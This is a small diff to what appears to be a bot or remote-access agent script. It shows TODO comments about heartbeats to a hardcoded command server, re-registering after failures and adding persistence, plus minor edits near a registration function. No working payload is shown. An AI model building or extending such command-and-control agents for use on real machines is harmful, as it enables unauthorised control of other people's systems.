@@ -16,7 +16,9 @@ TODO2: Create error checking for checking in with the server
 TODO2-1: Upon three failure of heartbeat ("No such bot response"), 
 try re-register 
 
-TODO3: Create persistence on the script itself. 
+TODO3: Implement error checking on the entire agent  
+
+TODO4: Create persistence on the script itself. 
 """
 # Need to have hardcoded server ip address 
 
@@ -58,9 +60,9 @@ def firstcontact():
 
     global REGISTERKEY
     json_data = json.loads(res.text)
+    #print(res.text)
     REGISTERKEY = json_data['registerkey']
-    #print(REGISTERKEY)
-
+    
 def register(ip, os, user):
     url = URL + '/register'
 
